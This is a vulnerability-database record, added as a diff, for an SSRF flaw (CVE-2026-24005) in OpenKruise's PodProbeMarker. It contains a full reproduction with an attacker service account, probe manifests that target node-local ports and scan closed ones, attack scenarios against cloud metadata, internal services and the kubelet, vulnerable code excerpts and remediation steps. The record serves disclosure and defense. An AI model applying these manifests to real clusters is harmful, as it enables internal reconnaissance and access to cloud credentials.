@@ -1,0 +1,396 @@
+advisory_id: GHSA-9fj4-3849-rv9g
+datasource_id: github_osv/GHSA-9fj4-3849-rv9g
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-9fj4-3849-rv9g/GHSA-9fj4-3849-rv9g.json
+aliases:
+  - CVE-2026-24005
+summary: |
+  OpenKruise PodProbeMarker is Vulnerable to SSRF via Unrestricted Host Field
+  ## Summary
+
+  PodProbeMarker allows defining custom probes with TCPSocket or HTTPGet handlers. The webhook validation does not restrict the Host field in these probe configurations. Since kruise-daemon runs with hostNetwork=true, it executes probes from the node network namespace. An attacker with PodProbeMarker creation permission can specify arbitrary Host values (127.0.0.1, 169.254.169.254, internal IPs) to trigger SSRF from the node, perform port scanning, and receive response feedback through NodePodProbe status messages.
+
+  ## Kubernetes Version
+
+  - Kubernetes: v1.30.0 (kind cluster)
+  - Distribution: kind
+
+  ## Component Version
+
+  - OpenKruise: v1.8.0
+  - kruise-daemon: DaemonSet with hostNetwork=true
+  - Affected CRDs: PodProbeMarker, NodePodProbe
+
+  ## Steps To Reproduce
+
+  ### Environment Setup
+
+  1. Install OpenKruise v1.8.0 in kind cluster:
+  ```bash
+  helm repo add openkruise https://openkruise.github.io/charts/
+  helm install kruise openkruise/kruise --version 1.8.0 \
+    --namespace kruise-system --create-namespace
+  ```
+
+  2. Verify kruise-daemon runs with hostNetwork:
+  ```bash
+  kubectl -n kruise-system get ds kruise-daemon -o yaml | grep hostNetwork
+  ```
+  Output:
+  ```
+  hostNetwork: true
+  ```
+
+  3. Create test namespace and RBAC:
+  ```bash
+  kubectl apply -f - <<EOF
+  apiVersion: v1
+  kind: Namespace
+  metadata:
+    name: tenant-a
+  ---
+  apiVersion: v1
+  kind: ServiceAccount
+  metadata:
+    name: attacker
+    namespace: tenant-a
+  ---
+  apiVersion: rbac.authorization.k8s.io/v1
+  kind: Role
+  metadata:
+    name: ppm-creator
+    namespace: tenant-a
+  rules:
+  - apiGroups: ["apps.kruise.io"]
+    resources: ["podprobemarkers"]
+    verbs: ["create","get","list","watch"]
+  ---
+  apiVersion: rbac.authorization.k8s.io/v1
+  kind: RoleBinding
+  metadata:
+    name: ppm-creator-binding
+    namespace: tenant-a
+  subjects:
+  - kind: ServiceAccount
+    name: attacker
+    namespace: tenant-a
+  roleRef:
+    apiGroup: rbac.authorization.k8s.io
+    kind: Role
+    name: ppm-creator
+  EOF
+  ```
+
+  4. Deploy victim workload:
+  ```bash
+  kubectl apply -f - <<EOF
+  apiVersion: apps/v1
+  kind: Deployment
+  metadata:
+    name: victim
+    namespace: tenant-a
+  spec:
+    replicas: 1
+    selector:
+      matchLabels:
+        app: victim
+    template:
+      metadata:
+        labels:
+          app: victim
+      spec:
+        containers:
+        - name: victim
+          image: busybox:1.36
+          command: ["/bin/sh","-c","sleep 36000"]
+  EOF
+  ```
+
+  ### Exploitation Steps
+
+  5. Verify node-local port accessibility (kubelet healthz):
+  ```bash
+  NODE_CONTAINER=$(docker ps --format '{{.Names}}' | grep control-plane)
+  docker exec $NODE_CONTAINER curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:10248/healthz
+  ```
+  Output:
+  ```
+  200
+  ```
+
+  6. Create SSRF PodProbeMarker targeting node-local port (as attacker):
+  ```bash
+  kubectl -n tenant-a apply --as system:serviceaccount:tenant-a:attacker -f - <<EOF
+  apiVersion: apps.kruise.io/v1alpha1
+  kind: PodProbeMarker
+  metadata:
+    name: ppm-tcp-ssrf
+    namespace: tenant-a
+  spec:
+    selector:
+      matchLabels:
+        app: victim
+    probes:
+    - name: tcp-ssrf
+      containerName: victim
+      podConditionType: ssrf.kruise.io/tcp
+      probe:
+        tcpSocket:
+          host: 127.0.0.1
+          port: 10248
+        timeoutSeconds: 2
+        periodSeconds: 5
+  EOF
+  ```
+  Output:
+  ```
+  podprobemarker.apps.kruise.io/ppm-tcp-ssrf created
+  ```
+
+  7. Wait for probe execution and observe SSRF result:
+  ```bash
+  sleep 10
+  NODE_NAME=$(kubectl get nodes -o jsonpath='{.items[0].metadata.name}')
+  kubectl get nodepodprobe $NODE_NAME -o yaml | grep -A 20 "ppm-tcp-ssrf"
+  ```
+  Output:
+  ```yaml
+        name: ppm-tcp-ssrf#tcp-ssrf
+        probe:
+          tcpSocket:
+            host: 127.0.0.1
+            port: 10248
+  status:
+    podProbeStatuses:
+    - name: victim-8596ff64d6-jklnb
+      namespace: tenant-a
+      probeStates:
+      - lastProbeTime: "2026-01-13T17:48:10Z"
+        name: ppm-tcp-ssrf#tcp-ssrf
+        state: Succeeded
+  ```
+
+  Evidence: Probe succeeded, confirming kruise-daemon accessed node-local port 127.0.0.1:10248 from node network namespace.
+
+  8. Demonstrate port scanning capability (closed port):
+  ```bash
+  kubectl -n tenant-a apply --as system:serviceaccount:tenant-a:attacker -f - <<EOF
+  apiVersion: apps.kruise.io/v1alpha1
+  kind: PodProbeMarker
+  metadata:
+    name: ppm-tcp-closed
+    namespace: tenant-a
+  spec:
+    selector:
+      matchLabels:
+        app: victim
+    probes:
+    - name: tcp-closed
+      containerName: victim
+      podConditionType: ssrf.kruise.io/tcp-closed
+      probe:
+        tcpSocket:
+          host: 127.0.0.1
+          port: 9999
+        timeoutSeconds: 2
+        periodSeconds: 5
+  EOF
+  ```
+
+  9. Observe port scanning result:
+  ```bash
+  kubectl get nodepodprobe $NODE_NAME -o yaml | grep -A 5 "ppm-tcp-closed"
+  ```
+  Output:
+  ```yaml
+      - lastProbeTime: "2026-01-13T17:51:08Z"
+        message: 'dial tcp 127.0.0.1:9999: connect: connection refused'
+        name: ppm-tcp-closed#tcp-closed
+        state: Failed
+  ```
+
+  Evidence: Failed probe with "connection refused" message enables port state differentiation for scanning.
+
+  10. Verify Pod condition and events:
+  ```bash
+  VICTIM_POD=$(kubectl -n tenant-a get pod -l app=victim -o jsonpath='{.items[0].metadata.name}')
+  kubectl -n tenant-a describe pod $VICTIM_POD | grep -A 10 "Conditions:"
+  ```
+  Output:
+  ```
+  Conditions:
+    Type                        Status
+    ssrf.kruise.io/tcp          True
+    ssrf.kruise.io/tcp-closed   False
+
+  Events:
+    Normal  KruiseProbeSucceeded  96s (x24 over 3m26s)  kruise-daemon-podprobe
+  ```
+
+  ### Source Code Evidence
+
+  11. TCPSocket Host field used without restriction:
+
+  File: `pkg/daemon/podprobe/prober.go`
+  ```go
+  func (pb *prober) newTCPSocketProber(tcp *v1.TCPSocketAction, podIP string) tcpProber {
+      host := tcp.Host
+      if host == "" {
+          host = podIP
+      }
+      return tcpProber{
+          tcp: tcp,
+          host: host,
+      }
+  }
+  ```
+
+  12. Webhook validation does not check Host field:
+
+  File: `pkg/webhook/podprobemarker/validating/probe_create_update_handler.go`
+  ```go
+  func validateTCPSocketAction(tcp *corev1.TCPSocketAction, fldPath *field.Path) field.ErrorList {
+      return ValidatePortNumOrName(tcp.Port, fldPath.Child("port"))
+  }
+  ```
+
+  Note: Only port validation, no Host restriction.
+
+  ### Attack Scenarios
+
+  Scenario 1 - Cloud metadata access:
+  ```yaml
+  probe:
+    tcpSocket:
+      host: 169.254.169.254
+      port: 80
+  ```
+
+  Scenario 2 - Internal service discovery:
+  ```yaml
+  probe:
+    tcpSocket:
+      host: 10.0.0.1
+      port: 6379
+  ```
+
+  Scenario 3 - Node-local kubelet API:
+  ```yaml
+  probe:
+    tcpSocket:
+      host: 127.0.0.1
+      port: 10250
+  ```
+
+  ## Supporting Material/References
+
+  ### Verification Evidence
+
+  1. kruise-daemon hostNetwork configuration:
+  ```bash
+  $ kubectl -n kruise-system get ds kruise-daemon -o yaml | grep -A 2 "hostNetwork"
+        hostNetwork: true
+        restartPolicy: Always
+  ```
+
+  2. Successful SSRF to open port (127.0.0.1:10248):
+  ```yaml
+  status:
+    podProbeStatuses:
+      probeStates:
+      - name: ppm-tcp-ssrf#tcp-ssrf
+        state: Succeeded
+  ```
+
+  3. Port scanning result for closed port (127.0.0.1:9999):
+  ```yaml
+  status:
+    podProbeStatuses:
+      probeStates:
+      - message: 'dial tcp 127.0.0.1:9999: connect: connection refused'
+        name: ppm-tcp-closed#tcp-closed
+        state: Failed
+  ```
+
+  4. Pod condition reflecting probe results:
+  ```
+  Conditions:
+    Type                        Status
+    ssrf.kruise.io/tcp          True
+    ssrf.kruise.io/tcp-closed   False
+  ```
+
+  ### Impact Assessment
+
+  - Confidentiality: Medium-High. Access to node-local services, cloud metadata, internal network resources.
+  - Integrity: Low. Primarily information disclosure.
+  - Availability: Medium. Resource consumption from probe requests.
+
+  ### Limitations
+
+  HTTPGet probe rejected by webhook in OpenKruise v1.8.0:
+  ```
+  Error: admission webhook denied the request: spec.probe.probe: Forbidden: current no support http probe
+  ```
+
+  TCPSocket probe remains vulnerable.
+
+  ### Remediation
+
+  Temporary mitigation:
+  - Restrict PodProbeMarker creation permissions
+  - Apply network policies limiting kruise-daemon egress
+  - Audit existing PodProbeMarker resources
+
+  Permanent fix:
+  - Enforce Host field restrictions in webhook validation
+  - Deny private IP ranges (127.0.0.0/8, 10.0.0.0/8, 169.254.0.0/16)
+  - Require Host to be empty or equal to PodIP
+  - Sanitize error messages in NodePodProbe status
+
+  ---
+
+  **Verification Environment**: kind v1.30.0 + OpenKruise v1.8.0
+impacted_packages:
+  - purl: pkg:github/openkruise/kruise
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/openkruise/kruise
+        commit: 94364b76adf3e8a1749a31afe809a163bed29613
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '0.0'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-9fj4-3849-rv9g/GHSA-9fj4-3849-rv9g.json
+  - score: LOW
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-918
+references:
+  - url: https://github.com/openkruise/kruise
+    reference_type:
+    reference_id:
+  - url: https://github.com/openkruise/kruise/commit/94364b76adf3e8a1749a31afe809a163bed29613
+    reference_type:
+    reference_id:
+  - url: https://github.com/openkruise/kruise/releases/tag/v1.7.5
+    reference_type:
+    reference_id:
+  - url: https://github.com/openkruise/kruise/releases/tag/v1.8.3
+    reference_type:
+    reference_id:
+  - url: https://github.com/openkruise/kruise/security/advisories/GHSA-9fj4-3849-rv9g
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-24005
+    reference_type:
+    reference_id:
+exploits: []
